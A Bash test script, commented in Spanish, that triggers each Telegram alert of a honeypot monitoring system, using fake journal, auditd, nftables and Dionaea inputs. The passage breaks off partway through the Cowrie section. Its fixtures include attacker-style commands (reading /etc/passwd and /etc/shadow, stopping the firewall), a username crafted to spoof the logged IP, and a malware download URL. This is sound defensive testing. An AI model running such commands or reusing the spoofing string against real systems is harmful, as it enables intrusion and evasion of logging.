#!/usr/bin/env bash
#
# probar-avisos.sh
# Dispara, uno a uno, TODOS los avisos que la maquina puede mandar por
# Telegram, para poder verlos llegar antes de exponer el senuelo.
#
#   probar-avisos.sh            los manda de verdad, por los bots de verdad
#   probar-avisos.sh --seco     los escribe por pantalla y no manda nada
#   probar-avisos.sh --solo N   solo el numero N de la lista
#
# POR QUE NO ES UN "send-alert.sh hola".
#
# Mandar un texto escrito a mano prueba el token y poco mas. Aqui cada aviso
# lo compone EL MISMO SCRIPT que lo compondria el dia que pase de verdad: se
# le da una entrada falsa ---un journal, una base de datos, una respuesta de
# la API de Mullvad--- y se le deja hacer su trabajo. Lo que llega al movil
# es byte a byte lo que llegara aquel dia, con su HTML, su troceado y sus
# banderas. Si algo se rompe al formatear, se rompe aqui y no alli.
#
# Y NO TOCA NADA DE PRODUCCION. Todos los vigilantes admiten por variable de
# entorno donde esta su estado y de donde leen; aqui se les apunta a un
# directorio temporal que se borra al salir. Ningun contador avanza, ninguna
# IP queda marcada como "ya avisada", ninguna base se modifica.
#
# LOS AVISOS DEL BOT DE COWRIE entran tambien, al final. Ese plugin vive
# DENTRO del senuelo y solo habla cuando hay una sesion, asi que a esos no se
# les falsea la entrada: se entra de verdad, se teclea y se sube un fichero.
# Son los unicos de aqui que DEJAN RASTRO en produccion ---sesiones en la base
# de Cowrie, ordenes en el registro y el fichero subido en downloads/---, y
# apareceran luego en el informe de analisis, marcados como [IP PROPIA], que
# es como se reconocen. En seco no se hacen: esos los manda el plugin por SU
# bot y aqui no habria nada que interceptar.
#
# No hacen falta sshpass ni telnet. La contrasena se le da a ssh con
# SSH_ASKPASS, que trae OpenSSH, y la sesion de telnet se abre con el
# /dev/tcp de bash. Instalar dos herramientas en el anfitrion para un ensayo
# es dejar dos herramientas mas a quien algun dia entre.
#
# Dos avisos de Cowrie no salen ni asi, y el motivo NO es un umbral: es que
# una sesion lanzada desde el anfitrion sale de 172.20.0.x, que el plugin
# tiene en su lista blanca, y a una IP propia ni se le banea ni se le
# silencia nada. Asi que el baneo automatico y el resumen de lo silenciado
# solo los trae trafico de fuera, y llegan solos en cuanto el senuelo lleve
# un rato expuesto. Los umbrales (AUTOBAN_REPETICIONES, DIGEST_INTERVAL) se
# leen del entorno para poder bajarlos los primeros dias y verlos antes.
#
set -euo pipefail

# Donde viven los vigilantes. En la VPS es /opt/dirtyland/monitor; al probar
# desde el arbol del repositorio se apunta aqui a "TELEGRAM SCRIPTS".
MONITOR="${PROBAR_MONITOR:-/opt/dirtyland/monitor}"

# Segundos entre aviso y aviso. Telegram corta a ~20 mensajes por minuto y
# por chat; con 3 s sobra margen y la tanda entera baja de dos minutos.
PAUSA="${PROBAR_PAUSA:-3}"

SECO=0
SOLO=""
while [ $# -gt 0 ]; do
    case "${1:-}" in
        --seco) SECO=1 ;;
        --solo) SOLO="${2:-}"; shift ;;
        -h|--help) sed -n '3,9p' "$0"; exit 0 ;;
        *) echo "probar-avisos: opcion desconocida: $1" >&2; exit 2 ;;
    esac
    shift
done

TMP=$(mktemp -d)
trap 'rm -rf "$TMP"' EXIT
mkdir -p "$TMP/bin" "$TMP/estado"

# --- El doble de send-alert.sh, solo para --seco --------------------------
#
# Se escribe como fichero y se le pasa a cada vigilante por la variable ALERT
# (o ALERTA, en los de Python). Asi el vigilante corre entero ---compone el
# mensaje igual--- y lo unico que cambia es el ultimo paso.
cat > "$TMP/bin/alert-seco" <<'FIN'
#!/usr/bin/env bash
[ "${1:-}" = "--siempre" ] && shift
printf '===AVISO===\n%s\n' "${1:-}"
FIN
chmod +x "$TMP/bin/alert-seco"

if [ "$SECO" -eq 1 ]; then
    ALERT_REAL="$TMP/bin/alert-seco"
else
    ALERT_REAL="$MONITOR/send-alert.sh"
    [ -x "$ALERT_REAL" ] || {
        echo "probar-avisos: no encuentro $ALERT_REAL" >&2
        echo "  (para probar desde el repositorio: --seco)" >&2
        exit 1
    }

    # EL SILENCIO SE MIRA ANTES DE EMPEZAR. send-alert.sh se calla mientras
    # haya una ventana abierta, asi que un ensayo lanzado dentro de ella se
    # traga los veintitantos avisos sin rechistar ---solo llegaria el resumen
    # diario, que va con --siempre--- y uno se queda mirando el movil pensando
    # que el canal esta roto. Vale mas no empezar.
    SILENCIO="${SILENCIO:-$MONITOR/silencio}"
    if [ -f "$SILENCIO" ]; then
        hasta=$(awk -F= '/^hasta=/ { print $2; exit }' "$SILENCIO")
        if [ "$hasta" = "0" ] || { [ -n "$hasta" ] && [ "$(date +%s)" -lt "$hasta" ]; }; then
            echo "probar-avisos: hay una VENTANA DE SILENCIO abierta." >&2
            if [ "$hasta" = "0" ]; then
                echo "  Es indefinida (hasta=0): no se abrira sola." >&2
            else
                echo "  Termina el $(date -d "@$hasta" '+%Y-%m-%d %H:%M:%S' 2>/dev/null || echo "$hasta")." >&2
            fi
            echo "  Casi nada de lo que sigue llegaria al movil. Quitala con:" >&2
            echo "      sudo rm $SILENCIO" >&2
            echo "  o mira como quedan los avisos sin mandarlos, con --seco." >&2
            exit 1
        fi
    fi
fi

# guion NOMBRE -> la ruta del vigilante, este donde este.
guion() {
    local n="$1" d
    for d in "$MONITOR" "$MONITOR/DIONAEA" "$MONITOR/geoip"; do
        [ -f "$d/$n" ] && { printf '%s' "$d/$n"; return 0; }
    done
    return 1
}

N=0
SALTADOS=0
# paso "titulo" -> devuelve 1 si hay que saltarselo (por --solo)
paso() {
    N=$((N+1))
    if [ -n "$SOLO" ] && [ "$SOLO" != "$N" ]; then
        SALTADOS=$((SALTADOS+1))
        return 1
    fi
    printf '\n\033[1m%2d. %s\033[0m\n' "$N" "$1"
    return 0
}

# Entre aviso y aviso, salvo en seco (ahi no hay a quien saturar).
respira() { [ "$SECO" -eq 1 ] || sleep "$PAUSA"; }

falta() { echo "     (omitido: falta $1)"; }

# =========================================================================
#  BOT DEL ANFITRION
# =========================================================================

# --- ssh-watch.sh: los tres avisos de acceso al anfitrion -----------------
#
# ssh-watch lee "journalctl -u ssh -f". Se le pone delante en el PATH un
# journalctl falso que escupe tres lineas de sshd y termina; el bucle las
# procesa y sale solo. Las lineas son reales, copiadas de un journal de
# verdad, y con una IP de documentacion (RFC 5737) para que la bandera y la
# busqueda de pais tambien se ejerciten.
cat > "$TMP/bin/journalctl" <<'FIN'
#!/usr/bin/env bash
cat <<'LINEAS'
2026-09-11T10:15:02+0000 pc sshd[1234]: Accepted publickey for usuario from 203.0.113.9 port 51234 ssh2: ED25519 SHA256:xxxx
LINEAS
FIN
chmod +x "$TMP/bin/journalctl"

if paso "[Host] Login SSH exitoso"; then
    if g=$(guion ssh-watch.sh); then
        ALERT="$ALERT_REAL" PATH="$TMP/bin:$PATH" bash "$g" || true
        respira
    else falta ssh-watch.sh; fi
fi

if paso "[Host] INTENTO DE ACCESO A ROOT"; then
    cat > "$TMP/bin/journalctl" <<'FIN'
#!/usr/bin/env bash
cat <<'LINEAS'
2026-09-11T10:16:44+0000 pc sshd[1240]: ROOT LOGIN REFUSED from 198.51.100.23 port 44210
LINEAS
FIN
    chmod +x "$TMP/bin/journalctl"
    if g=$(guion ssh-watch.sh); then
        ALERT="$ALERT_REAL" PATH="$TMP/bin:$PATH" bash "$g" || true
        respira
    else falta ssh-watch.sh; fi
fi

# La linea lleva un nombre de usuario con comillas y un "from ... port" metido
# dentro A PROPOSITO: es el intento de enganar al extractor de IP que se
# describe en la cabecera de ssh-watch.sh. El aviso tiene que decir
# 192.0.2.55, que es la que anade sshd al final, y no la que escribio el
# atacante. Se prueba aqui ademas de en la suite porque este es el unico
# sitio donde se ve el mensaje ya montado.
if paso "[Host] Intento de login SSH FALLIDO"; then
    cat > "$TMP/bin/journalctl" <<'FIN'
#!/usr/bin/env bash
cat <<'LINEAS'
2026-09-11T10:17:05+0000 pc sshd[1251]: Invalid user "admin from 10.0.0.1 port 22" from 192.0.2.55 port 39112
LINEAS
FIN
    chmod +x "$TMP/bin/journalctl"
    if g=$(guion ssh-watch.sh); then
        ALERT="$ALERT_REAL" PATH="$TMP/bin:$PATH" bash "$g" || true
        respira
    else falta ssh-watch.sh; fi
fi

# --- comandos-watch.sh: ordenes tecleadas en el anfitrion -----------------
#
# Ya trae "--stdin" para las pruebas, asi que se le pasan las lineas tal cual
# las escribe registro-comandos.sh con logger. Una de ellas sale con codigo
# de salida distinto de cero, que es lo que hace que el aviso lo marque.
if paso "[Dirtyland] Ordenes tecleadas (comandos-watch)"; then
    if g=$(guion comandos-watch.sh); then
        printf '%s\n' \
"user=usuario tty=pts/0 from=203.0.113.9 pwd=/home/usuario rc=0 cmd=id" \
"user=usuario tty=pts/0 from=203.0.113.9 pwd=/home/usuario rc=0 cmd=cat /etc/passwd" \
"user=root tty=pts/0 from=203.0.113.9 pwd=/root rc=1 cmd=systemctl stop nftables" \
            | ALERT="$ALERT_REAL" COMANDOS_ESPERA=1 bash "$g" --stdin || true
        respira
    else falta comandos-watch.sh; fi
fi

# --- auditd-watch.py: lo mismo, pero visto por auditd ---------------------
#
# Con "--test N" lee las ultimas N lineas de AUDIT_LOG en vez de seguir el
# fichero. Las lineas son el formato crudo de auditd: los argumentos van en
# hexadecimal (a0/a1...) o en "argc/a0" segun el registro, y el script tiene
# que deshexificarlos --- por eso se prueba con una asi y no con texto plano.
if paso "[Dirtyland] Ordenes vistas por auditd"; then
    if g=$(guion auditd-watch.py); then
        cat > "$TMP/audit.log" <<'FIN'
type=SYSCALL msg=audit(1757585702.123:4711): arch=c000003e syscall=59 success=yes exit=0 a0=55d1 a1=55d2 a2=55d3 a3=0 items=2 ppid=4100 pid=4101 auid=1000 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=pts0 ses=3 comm="id" exe="/usr/bin/id" key="dirtyland-exec"
type=EXECVE msg=audit(1757585702.123:4711): argc=1 a0="id"
type=SYSCALL msg=audit(1757585710.456:4712): arch=c000003e syscall=59 success=yes exit=0 a0=55e1 a1=55e2 a2=55e3 a3=0 items=2 ppid=4100 pid=4109 auid=1000 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=pts0 ses=3 comm="cat" exe="/usr/bin/cat" key="dirtyland-exec"
type=EXECVE msg=audit(1757585710.456:4712): argc=2 a0="cat" a1=2F6574632F736861646F77
FIN
        ALERTA="$ALERT_REAL" AUDIT_LOG="$TMP/audit.log" \
            python3 "$g" --test 20 || true
        respira
    else falta auditd-watch.py; fi
fi

# --- breaker-watch.sh: el cortacircuitos de abuse.ch ----------------------
#
# El "saltado" ya tiene su --test dentro. El "rearmado" no, y se provoca
# como se provoca de verdad: un estado que dice que estaba saltado y una
# base donde ya no lo esta. Las dos rutas por variable de entorno.
# El "saltado" NO se manda con el --test que el script trae dentro: ese
# imprime un texto enlatado ---"Prueba manual, no ha saltado nada", fecha
# fija, motivo "ejemplo"--- y se salta justo la parte delicada. Se provoca
# como el rearmado: una base que dice que ha saltado y un estado que todavia
# no lo sabe. El motivo lleva "<", ">" y "&" A PROPOSITO: viene del rechazo
# de abuse.ch, o sea de fuera, y si el escapado se rompiera Telegram
# contestaria un 400 y perderiamos precisamente el aviso que menos podemos
# permitirnos perder. Aqui se ve llegar con los simbolos puestos.
if paso "[Dirtyland] Cortacircuitos SALTADO"; then
    if g=$(guion breaker-watch.sh); then
        if command -v sqlite3 >/dev/null 2>&1; then
            rm -f "$TMP/estado/breaker.state"
            sqlite3 "$TMP/estado/saltado.sqlite3"                 "CREATE TABLE breaker (account TEXT, tripped_at TEXT, reason TEXT);
                 INSERT INTO breaker VALUES ('abuse.ch', '2026-09-11 04:12:33',
                   'HTTP 403 <Forbidden> en MalwareBazaar & URLhaus');"
            ALERT="$ALERT_REAL" STATE_DB="$TMP/estado/saltado.sqlite3"                 STATE_DIR="$TMP/estado" STATE="$TMP/estado/breaker.state"                 bash "$g" || true
            respira
        else falta "el binario sqlite3"; fi
    else falta breaker-watch.sh; fi
fi

if paso "[Dirtyland] Cortacircuitos rearmado"; then
    if g=$(guion breaker-watch.sh); then
        if command -v sqlite3 >/dev/null 2>&1; then
            printf 'SALTADO 2026-09-01 12:00:00' > "$TMP/estado/breaker.state"
            sqlite3 "$TMP/estado/vacia.sqlite3" \
                "CREATE TABLE breaker (account TEXT, tripped_at TEXT, reason TEXT);"
            ALERT="$ALERT_REAL" STATE_DB="$TMP/estado/vacia.sqlite3" \
                STATE_DIR="$TMP/estado" STATE="$TMP/estado/breaker.state" \
                bash "$g" || true
            respira
        else falta "el binario sqlite3"; fi
    else falta breaker-watch.sh; fi
fi

# --- cuota-watch.sh: la cuota diaria de las plataformas -------------------
#
# Igual que el cortacircuitos: el "superada" trae su --test dentro, y el
# "restablecida" se provoca como pasa de verdad --- un estado que dice que
# ayer se agoto y una base donde hoy apenas se ha llamado ---.
#
# Los limites van por entorno y NO se leen de ratelimit.py. El ensayo tiene
# que poder correr aunque el reporter no este instalado, que es justo el caso
# de una maquina recien montada, y ademas asi el aviso sale siempre con las
# mismas cifras y se puede comparar de un dia para otro.
# Lo mismo que el cortacircuitos: nada de --test enlatado. Una base donde la
# plataforma se ha pasado del cupo y un estado que aun no lo ha avisado.
if paso "[Dirtyland] Cuota superada"; then
    if g=$(guion cuota-watch.sh); then
        if command -v sqlite3 >/dev/null 2>&1; then
            rm -f "$TMP/estado/cuota-superada.state"
            sqlite3 "$TMP/estado/superada.sqlite3"                 "CREATE TABLE api_calls (platform TEXT NOT NULL, day TEXT NOT NULL,
                                         calls INTEGER NOT NULL DEFAULT 0,
                                         PRIMARY KEY (platform, day));
                 INSERT INTO api_calls VALUES ('abuseipdb', '2026-09-12', 1000);"
            ALERT="$ALERT_REAL" STATE_DB="$TMP/estado/superada.sqlite3"                 STATE_DIR="$TMP/estado" STATE="$TMP/estado/cuota-superada.state"                 HOY="2026-09-12" LIMITES="abuseipdb 1000"                 bash "$g" || true
            respira
        else falta "el binario sqlite3"; fi
    else falta cuota-watch.sh; fi
fi

if paso "[Dirtyland] Cuota restablecida"; then
    if g=$(guion cuota-watch.sh); then
        if command -v sqlite3 >/dev/null 2>&1; then
            printf 'abuseipdb|2026-09-11\n' > "$TMP/estado/cuota.state"
            sqlite3 "$TMP/estado/cuota.sqlite3" \
                "CREATE TABLE api_calls (platform TEXT NOT NULL, day TEXT NOT NULL,
                                         calls INTEGER NOT NULL DEFAULT 0,
                                         PRIMARY KEY (platform, day));
                 INSERT INTO api_calls VALUES ('abuseipdb', '2026-09-12', 12);"
            ALERT="$ALERT_REAL" STATE_DB="$TMP/estado/cuota.sqlite3" \
                STATE_DIR="$TMP/estado" STATE="$TMP/estado/cuota.state" \
                HOY="2026-09-12" LIMITES="abuseipdb 1000" \
                bash "$g" || true
            respira
        else falta "el binario sqlite3"; fi
    else falta cuota-watch.sh; fi
fi

# --- baneadas-diario.sh: el parte de IPs bloqueadas -----------------------
#
# Se le pone un "nft" falso que devuelve un conjunto con tres IPs, una por
# cada origen que el script distingue (Cowrie, a mano desde Telegram, y las
# viejas sin etiqueta). Con el nft de verdad saldria el parte real, pero
# entonces la prueba dependeria de que hoy haya alguien baneado.
if paso "[Dirtyland] IP's baneadas (parte diario)"; then
    if g=$(guion baneadas-diario.sh); then
        cat > "$TMP/bin/nft-falso" <<'FIN'
#!/usr/bin/env bash
# Se le llama dos veces, una por cada set, y tiene que contestar distinto:
# "list set inet dirtyland ban4" y "... ban6". Los comentarios son los que
# escriben los dos caminos de baneo, mas uno sin comentario --- el tercer
# grupo del aviso, el de los baneos viejos de los que no consta el origen.
case " $* " in
  *" ban6 "*) cat <<'SALIDA'
table inet dirtyland {
	set ban6 {
		type ipv6_addr
		elements = { 2001:db8::dead comment "BANEO AUTOMATICO cowrie" }
	}
}
SALIDA
  ;;
  *) cat <<'SALIDA'
table inet dirtyland {
	set ban4 {
		type ipv4_addr
		flags timeout
		elements = { 203.0.113.9 comment "BANEO AUTOMATICO cowrie",
			     198.51.100.23 comment "BANEO MANUAL DESDE TELEGRAM",
			     192.0.2.55 }
	}
}
SALIDA
  ;;
esac
FIN
        chmod +x "$TMP/bin/nft-falso"
        ALERT="$ALERT_REAL" NFT="$TMP/bin/nft-falso" bash "$g" || true
        respira
    else falta baneadas-diario.sh; fi
fi

# --- daily-digest.sh: el resumen diario ----------------------------------
#
# Este va SIN falsear nada: lee el estado real de la maquina y ese es
# justamente el aviso que interesa ver antes de exponer. Es el mensaje mas
# largo de todos y el unico que ejercita el troceado de verdad.
if paso "[Dirtyland] Resumen diario (datos reales de la maquina)"; then
    if g=$(guion daily-digest.sh); then
        ALERT="$ALERT_REAL" bash "$g" || true
        respira
    else falta daily-digest.sh; fi
fi

# --- generar-tabla-paises.py: el aviso de que la tabla no se pudo rehacer -
#
# Se le da una URL que no existe. Es el unico de los tres fallos posibles
# que se puede provocar sin tocar la red de verdad, y los tres comparten
# cabecera y forma.
if paso "[Dirtyland] Tabla de paises: no se pudo regenerar"; then
    if g=$(guion generar-tabla-paises.py); then
        ALERTA="$ALERT_REAL" PAISES_FUENTE_BASE="file:///no/existe" \
            python3 "$g" --avisar --salida "$TMP/estado" || true
        respira
    else falta generar-tabla-paises.py; fi
fi

# --- generar-tabla-paises.py: el aviso de que los datos venian a medias ---
#
# El de arriba es el fallo al BAJAR. Este es el de despues: las fuentes
# llegan enteras, se dejan leer, y aun asi traen muchisimos menos rangos de
# los que trae una tabla sana. Entonces no se pisa la anterior, porque media
# tabla es peor que una vieja: deja paises sin bandera y nadie se entera.
#
# Se le sirven unas fuentes de juguete y se bajan los dos listones de tamano
# (PAISES_MINIMO_*), que estan para descartar paginas de error; sin bajarlos
# el ensayo moriria antes, en el aviso de arriba, y este no se veria nunca.
if paso "[Dirtyland] Tabla de paises: los datos llegaron incompletos"; then
    if g=$(guion generar-tabla-paises.py); then
        mkdir -p "$TMP/fuentes"
        for r in apnic ripencc arin afrinic lacnic; do
            printf '%s|AU|ipv4|1.0.0.0|256|20110811|allocated\n' "$r" \
                > "$TMP/fuentes/$r"
        done
        printf '1.0.0.0,1.0.0.255,AU\n2.0.0.0,2.0.0.255,FR\n' \
            | gzip > "$TMP/fuentes/dbip-$(date -u +%Y-%m).csv.gz"
        ALERTA="$ALERT_REAL" PAISES_FUENTE_BASE="file://$TMP/fuentes" \
            PAISES_MINIMO_RIR=1 PAISES_MINIMO_DBIP=1 \
            python3 "$g" --avisar --salida "$TMP/estado" || true
        respira
    else falta generar-tabla-paises.py; fi
fi

# =========================================================================
#  LOS SEIS DEL VIGILANTE DE PROXYS
# =========================================================================
#
# proxy-watch.sh compara lo que dice la API de Mullvad con lo que guardo la
# vez anterior, y avisa SOLO en la transicion. Asi que cada aviso necesita
# dos cosas: un estado "de antes" y una respuesta "de ahora". La respuesta
# se le sirve por fichero --- PROXY_WATCH_API acepta cualquier URL y curl
# entiende file://, asi que no hace falta red ni tocar Mullvad.
#
# Los nombres NO se escriben aqui: se leen del proxys.conf de verdad, que es
# el mismo sitio del que los lee el vigilante. Asi la prueba vale igual si
# manana son otros tres relays, u otros cinco.

CONF_PROXY="${PROXY_WATCH_CONF:-$MONITOR/proxys.conf}"
PROXY_G=""
guion proxy-watch.sh >/dev/null 2>&1 && PROXY_G=$(guion proxy-watch.sh)

RELAYS=()
if [ -r "$CONF_PROXY" ]; then
    mapfile -t RELAYS < <(sed -e 's/#.*//' -e 's/[[:space:]]//g' "$CONF_PROXY" | grep . || true)
fi

# json_relay NOMBRE ACTIVO -> un objeto de la lista de Mullvad.
#
# Los campos van EN EL ORDEN REAL de la API (country_code y active ANTES de
# socks_name). No es cosmetica: el plan B sin jq recorta el objeto entero
# por ese motivo, y una prueba con los campos al reves daba verde sobre un
# fallo que en la VPS dejaba los tres proxys por inactivos.
#
# El codigo de pais sale de las dos primeras letras del nombre del relay,
# que es como los nombra Mullvad. Asi la bandera es la que toca sea cual sea
# el relay, sin una tabla que mantener.
json_relay() {
    local n="$1" act="$2" cc="${1:0:2}"
    printf '{"country_code": "%s", "country_name": "", "active": %s, "socks_name": "%s.relays.mullvad.net"}' \
        "$cc" "$act" "$n"
}

# json_api ACT1 ACT2 ... -> la lista entera. Un "-" salta ese relay (para
# provocar el "fuera de la lista").
json_api() {
    local i=0 sep="" out="["
    for r in "${RELAYS[@]}"; do
        i=$((i+1))
        local a
        eval "a=\${$i}"
        [ "$a" = "-" ] && continue
        out+="${sep}$(json_relay "$r" "$a")"
        sep=", "
    done
    printf '%s]' "$out"
}

# estado_previo EST1 EST2 ... -> el fichero de estado de la pasada anterior.
estado_previo() {
    local i=0 activos=0
    : > "$TMP/estado/proxy-watch.state"
    for r in "${RELAYS[@]}"; do
        i=$((i+1))
        local e
        eval "e=\${$i}"
        echo "estado|$r|$e|${r:0:2}" >> "$TMP/estado/proxy-watch.state"
        [ "$e" = activo ] && activos=$((activos+1))
    done
    echo "activos|$activos" >> "$TMP/estado/proxy-watch.state"
    echo "revisado|$(date -u +%s)" >> "$TMP/estado/proxy-watch.state"
}

# corre_proxy -> lanza el vigilante con el estado y el JSON ya preparados.
corre_proxy() {
    PROXY_WATCH_ALERT="$ALERT_REAL" \
    PROXY_WATCH_CONF="$CONF_PROXY" \
    PROXY_WATCH_STATE_DIR="$TMP/estado" \
    PROXY_WATCH_API="file://$TMP/mullvad.json" \
        bash "$PROXY_G" || true
}

proxy_listo() {
    [ -n "$PROXY_G" ] || { falta proxy-watch.sh; return 1; }
    [ "${#RELAYS[@]}" -ge 1 ] || { falta "$CONF_PROXY (sin relays)"; return 1; }
    return 0
}

if paso "[Proxy] Inactivo al arrancar (primera pasada)"; then
    if proxy_listo; then
        rm -f "$TMP/estado/proxy-watch.state"
        json_api false true true > "$TMP/mullvad.json"
        corre_proxy
        respira
    fi
fi

if paso "[Proxy] Un relay se cae"; then
    if proxy_listo; then
        estado_previo activo activo activo
        json_api true true false > "$TMP/mullvad.json"
        corre_proxy
        respira
    fi
fi

if paso "[Proxy] Y vuelve"; then
    if proxy_listo; then
        estado_previo activo activo inactivo
        json_api true true true > "$TMP/mullvad.json"
        corre_proxy
        respira
    fi
fi

if paso "[Proxy] Un relay desaparece de la lista de Mullvad"; then
    if proxy_listo; then
        estado_previo activo activo activo
        json_api true true - > "$TMP/mullvad.json"
        corre_proxy
        respira
    fi
fi

if paso "[Proxy] Queda uno solo: acceso sin respaldo"; then
    if proxy_listo; then
        estado_previo activo activo activo
        json_api true false false > "$TMP/mullvad.json"
        corre_proxy
        respira
    fi
fi

if paso "[Proxy] SIN ACCESO: se caen todos"; then
    if proxy_listo; then
        estado_previo activo activo activo
        json_api false false false > "$TMP/mullvad.json"
        corre_proxy
        respira
    fi
fi

# =========================================================================
#  BOT DEL SENUELO: los cuatro de Dionaea
# =========================================================================
#
# dionaea-watch.sh manda por el bot del senuelo (telegram.cfg), no por
# send-alert.sh. Se le construye una base con el esquema real: unas cuantas
# conexiones de ataque y dos descargas.
#
# Las dos descargas no son un capricho. El aviso resuelve el SHA-256 mirando
# el fichero capturado y calculandolo ---Dionaea solo guarda el MD5---, asi
# que hay dos caminos distintos que ensenan cosas distintas:
#
#   - el fichero esta: sale "SHA256:" y el enlace a MalwareBazaar funciona.
#   - el fichero no esta: sale "MD5:" y no hay enlace.
#
# Se prueban los dos. Y los hashes no se inventan: se calculan de verdad
# sobre un fichero que se crea aqui, que es la unica forma de que el enlace
# de VirusTotal lleve a algo.
dionaea_base() {   # dionaea_base HORAS_DESDE_LA_ULTIMA_CONEXION
    local atras="${1:-0}"
    rm -f "$TMP/dionaea.sqlite"
    mkdir -p "$TMP/binaries"

    # El fichero capturado de mentira. Un byte, para que exista y no lo salte
    # el "-s" de construir_mapa. De el salen los dos hashes de verdad.
    printf 'a' > "$TMP/binaries/muestra"
    local md5_ok
    md5_ok=$(md5sum "$TMP/binaries/muestra" | cut -d' ' -f1)

    # Y un MD5 de un fichero que NO esta en el directorio: el del fichero
    # vacio. Es el hash mas conocido que existe, no es malware, y sirve para
    # ver el aviso cuando no se puede resolver el SHA-256.
    local md5_huerfano="d41d8cd98f00b204e9800998ecf8427e"

    local ahora
    ahora=$(date -u +%s)
    local t=$(( ahora - atras * 3600 ))

    python3 - "$TMP/dionaea.sqlite" "$t" "$md5_ok" "$md5_huerfano" <<'FIN'
import sqlite3, sys
ruta, t, md5_ok, md5_huerfano = sys.argv[1], int(sys.argv[2]), sys.argv[3], sys.argv[4]
db = sqlite3.connect(ruta)
db.execute("""CREATE TABLE connections (connection INTEGER PRIMARY KEY,
              connection_type TEXT, connection_protocol TEXT,
              connection_timestamp INTEGER, local_port INTEGER,
              remote_host TEXT)""")
db.execute("""CREATE TABLE downloads (download INTEGER PRIMARY KEY,
              connection INTEGER, download_md5_hash TEXT, download_url TEXT)""")
# Tres atacantes: uno insiste contra SMB, otro prueba MSSQL, otro RPC.
filas = []
n = 0
for ip, proto, puerto, veces in (("203.0.113.9", "smbd", 445, 6),
                                 ("198.51.100.23", "mssqld", 1433, 2),
                                 ("192.0.2.55", "epmapper", 135, 1)):
    for _ in range(veces):
        n += 1
        filas.append((n, "accept", proto, t, puerto, ip))
db.executemany("INSERT INTO connections VALUES (?,?,?,?,?,?)", filas)
db.executemany("INSERT INTO downloads VALUES (?,?,?,?)", [
    (1, 1, md5_ok, "http://203.0.113.9/bin.sh"),
    (2, 7, md5_huerfano, "smb://198.51.100.23/x"),
])
db.commit()
FIN
}

estado_dionaea() {   # estado_dionaea MUDO_AVISADO
    local mc md
    mc=$(sqlite3 "$TMP/dionaea.sqlite" "SELECT COALESCE(MAX(connection),0) FROM connections;")
    md=$(sqlite3 "$TMP/dionaea.sqlite" "SELECT COALESCE(MAX(download),0) FROM downloads;")
    printf 'LAST_CONN=%s\nLAST_DL=%s\nMUDO_AVISADO=%s\nRESUMEN_ULTIMO=0\n' \
        "$mc" "$md" "${1:-0}" > "$TMP/estado/dionaea-telegram.state"
}

corre_dionaea() {
    DIONAEA_DB="$TMP/dionaea.sqlite" \
    DIONAEA_STATE_DIR="$TMP/estado" \
    BINARIES="$TMP/binaries" \
    DIONAEA_DRY_RUN="$SECO" \
        bash "$1" "${@:2}" || true
}

if paso "[Dionaea] Nuevas conexiones de ataque + malware capturado"; then
    if g=$(guion dionaea-watch.sh); then
        if command -v sqlite3 >/dev/null 2>&1; then
            dionaea_base 0
            corre_dionaea "$g" --test 100
            respira
        else falta "el binario sqlite3"; fi
    else falta dionaea-watch.sh; fi
fi

# Los dos siguientes van SIN --test, y es a proposito: la comprobacion de
# "vivo pero mudo" solo corre en la pasada de verdad (con --test no se mira,
# porque --test no toca el estado y esa vigilancia se apoya en el). Se puede
# hacer sin riesgo porque el estado vive en el directorio temporal.
#
# El estado se escribe a mano antes de cada una, con LAST_CONN y LAST_DL ya
# al dia: asi no vuelve a salir el aviso de conexiones nuevas y queda solo el
# que se quiere ver.
# "Vivo pero mudo": el contenedor sigue Up pero lleva horas sin anotar. Se
# consigue con una base cuya ultima conexion es vieja. El umbral son 2 h, y
# se le dan 120 para que el aviso diga un numero que se lee bien.
if paso "[Dionaea] Vivo pero mudo (sin anotar nada)"; then
    if g=$(guion dionaea-watch.sh); then
        if command -v sqlite3 >/dev/null 2>&1; then
            dionaea_base 120
            estado_dionaea 0
            corre_dionaea "$g"
            respira
        else falta "el binario sqlite3"; fi
    else falta dionaea-watch.sh; fi
fi

# Y el que cierra el anterior: vuelve a haber actividad reciente y hay una
# marca de "ya avise" que recoger. Sin esa marca no se felicita solo, que es
# justo lo que comprueba la suite.
if paso "[Dionaea] Vuelve a anotar conexiones"; then
    if g=$(guion dionaea-watch.sh); then
        if command -v sqlite3 >/dev/null 2>&1; then
            dionaea_base 0
            estado_dionaea "$(( $(date -u +%s) - 7200 ))"
            corre_dionaea "$g"
            respira
        else falta "el binario sqlite3"; fi
    else falta dionaea-watch.sh; fi
fi

# =========================================================================
#  BOT DEL SENUELO: los tres de Cowrie
# =========================================================================
#
# Estos tres no los compone ningun vigilante del anfitrion: los compone el
# plugin que vive DENTRO de Cowrie, y ese solo habla cuando hay una sesion.
# Asi que aqui no se falsea ninguna entrada ---se entra de verdad, se teclea
# y se sube un fichero---, que es justo lo que hara un atacante.
#
# OJO: estos SI dejan rastro. Quedan sesiones en la base de Cowrie, ordenes
# en el registro y el fichero subido en downloads/, y saldran en el informe
# de analisis. El plugin los sella como [IP PROPIA] porque el origen es la
# red interna de Docker, asi que se reconocen de un vistazo, pero estan ahi.
#
# NI SSHPASS NI TELNET. Las dos cosas se hacen con lo que ya hay:
#
#   - la contrasena se le pasa a ssh con SSH_ASKPASS, que es de OpenSSH. Con
#     SSH_ASKPASS_REQUIRE=force la pide por ahi aunque haya terminal, que es
#     justo lo que hace falta aqui.
#   - la sesion de telnet se abre con el /dev/tcp de bash, sin cliente.
#
# Instalar dos herramientas en el anfitrion para un ensayo de un minuto es
# dejarle dos herramientas mas a quien algun dia entre.
if [ "$SECO" -eq 1 ]; then
    echo
    echo "  (en seco no van los tres de Cowrie: esos los manda el plugin"
    echo "   desde dentro del senuelo, por su bot, y no hay nada que"
    echo "   interceptar. Se ensayan lanzando el guion sin --seco.)"
else
    SENUELO_IP="${SENUELO_IP:-172.20.0.10}"
    SENUELO_SSH="${SENUELO_SSH:-2222}"
    SENUELO_TELNET="${SENUELO_TELNET:-2223}"
    SENUELO_USUARIO="${SENUELO_USUARIO:-alyosha}"
    SENUELO_CLAVE="${SENUELO_CLAVE:-alyosha123}"

    # El ayudante que le dice la contrasena a ssh. Vive en el temporal, que
    # se borra al salir, y solo lo puede leer quien lo escribe.
    printf '#!/bin/sh\necho %s\n' "$SENUELO_CLAVE" > "$TMP/bin/dar-clave"
    chmod 700 "$TMP/bin/dar-clave"
